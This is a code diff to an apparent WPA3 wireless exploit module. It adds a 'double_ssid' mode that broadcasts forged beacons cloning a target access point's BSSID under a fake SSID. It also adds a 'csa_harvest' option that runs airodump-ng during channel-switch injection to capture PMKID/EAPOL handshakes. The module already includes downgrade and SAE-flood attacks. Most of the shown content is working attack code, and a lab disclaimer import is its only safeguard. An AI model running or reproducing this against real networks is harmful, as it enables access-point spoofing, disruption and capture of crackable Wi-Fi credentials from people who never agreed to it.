@@ -5,7 +5,7 @@
 Bridges techniques from DragonShift, WPA3-Transition-mode-Downgrade-attack,
 dragon-drain / WPA3-Attack-Nuseo1, Politician (CSA), and wpa3_sec (timing).
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -26,7 +26,7 @@ from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_
 
 logger = logging.getLogger(__name__)
 
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 
 
 def _forge_root() -> Path:
@@ -145,6 +145,7 @@ class Exploit(Exploit):
             "submodules/IoT/wireless-research/DragonShift",
             "submodules/IoT/wireless-research/WPA3-Transition-mode-Downgrade-attack",
             "submodules/IoT/wireless-research/dragon-drain-wpa3-airgeddon-plugin",
+            "submodules/IoT/wireless-research/WPA3-Attack-Nuseo1",
             "submodules/IoT/wireless-research/Politician",
             "submodules/IoT/wireless-research/wpa3_sec",
             "submodules/IoT/wireless-research/wpa3-sae-flood-anomaly-detection",
@@ -158,7 +159,7 @@ class Exploit(Exploit):
     target_channel = OptInteger(6, "Target AP channel")
     attack = OptString(
         "auto",
-        "Attack: downgrade | sae_flood | csa | timing | auto",
+        "Attack: downgrade | sae_flood | csa | double_ssid | timing | auto",
     )
     flood_variant = OptString(
         "standard",
@@ -171,6 +172,7 @@ class Exploit(Exploit):
     )
     flood_rate = OptInteger(200, "Target packets per second (Scapy SAE flood)")
     csa_channel = OptInteger(1, "New channel in CSA IE (rogue / hop target)")
+    csa_harvest = OptBool(False, "Capture PMKID/EAPOL during CSA attack window")
     duration = OptInteger(60, "Attack duration (seconds); 0 = run until Ctrl+C")
     dry_run = OptBool(False, "Print plan only")
     rogue_wpa_passphrase = OptString(
@@ -194,7 +196,7 @@ class Exploit(Exploit):
         advanced=True,
     )
 
-    _VALID_ATTACKS = frozenset({"downgrade", "sae_flood", "csa", "timing", "auto"})
+    _VALID_ATTACKS = frozenset({"downgrade", "sae_flood", "csa", "double_ssid", "timing", "auto"})
     _VALID_FLOOD = frozenset({"omnivore", "muted", "cookie_guzzler", "standard"})
 
     def _bssid_str(self) -> str:
@@ -247,6 +249,8 @@ class Exploit(Exploit):
             self._run_sae_flood()
         elif atk == "csa":
             self._run_csa()
+        elif atk == "double_ssid":
+            self._run_double_ssid()
         elif atk == "timing":
             self._run_timing()
         else:
@@ -553,11 +557,35 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_status("[dry_run] CSA burst: AP {} current_ch={} -> new_ch={}".format(bssid, cur_ch, new_ch))
+            if self.csa_harvest:
+                print_info("[dry_run] PMKID/EAPOL harvest would run in parallel (airodump-ng).")
             return
 
         dsec = self._duration_seconds(duration_override)
         end_t = time.time() + dsec if dsec > 0 else None
         burst = 8
+        harvest_proc = None
+        if self.csa_harvest and shutil.which("airodump-ng"):
+            cap_base, _ = self._handshake_paths()
+            harvest_cmd = [
+                "sudo",
+                "airodump-ng",
+                "--bssid",
+                bssid,
+                "-c",
+                str(cur_ch),
+                "-w",
+                str(cap_base) + "_csa_harvest",
+                "--output-format",
+                "pcap,csv",
+                iface,
+            ]
+            harvest_proc = subprocess.Popen(
+                harvest_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            print_status("CSA harvest capture started.")
         try:
             while end_t is None or time.time() < end_t:
                 for _ in range(burst):
@@ -566,6 +594,48 @@ class Exploit(Exploit):
                 time.sleep(1.0)
         except KeyboardInterrupt:
             print_status("CSA injection stopped.")
+        finally:
+            if harvest_proc and harvest_proc.poll() is None:
+                harvest_proc.terminate()
+                try:
+                    harvest_proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    harvest_proc.kill()
+
+    def _run_double_ssid(self) -> None:
+        """Emit beacons cloning BSSID while advertising manipulated SSID."""
+        if not self._require_bssid():
+            return
+        if not str(self.target_ssid).strip():
+            print_error("Set target_ssid for double_ssid mode.")
+            return
+        scapy = self._scapy()
+        if not scapy:
+            return
+        from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, RandString, sendp  # type: ignore
+
+        iface = str(self.interface)
+        bssid = str(self.target_bssid).lower()
+        base_ssid = str(self.target_ssid)
+        fake_ssid = "{}_clone".format(base_ssid[:24])
+        _set_monitor_channel(iface, int(self.target_channel))
+        pkt = (
+            RadioTap()
+            / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
+            / Dot11Beacon(cap=0x0431)
+            / Dot11Elt(ID="SSID", info=fake_ssid.encode("utf-8", errors="ignore"))
+            / Dot11Elt(ID="DSset", info=bytes([int(self.target_channel) & 0xFF]))
+            / Dot11Elt(ID=221, info=bytes(RandString(size=6)))
+        )
+        if self.dry_run:
+            print_status("[dry_run] double_ssid BSSID={} fake_ssid={}".format(bssid, fake_ssid))
+            return
+        end_t = time.time() + int(self.duration) if int(self.duration) > 0 else None
+        try:
+            while end_t is None or time.time() < end_t:
+                sendp(pkt, iface=iface, inter=0.02, count=10, verbose=0)
+        except KeyboardInterrupt:
+            print_status("double_ssid stopped.")
 
     def _run_timing(self) -> None:
         """Passive timing stats on SAE auth frames (wpa3_sec-style lab signal)."""
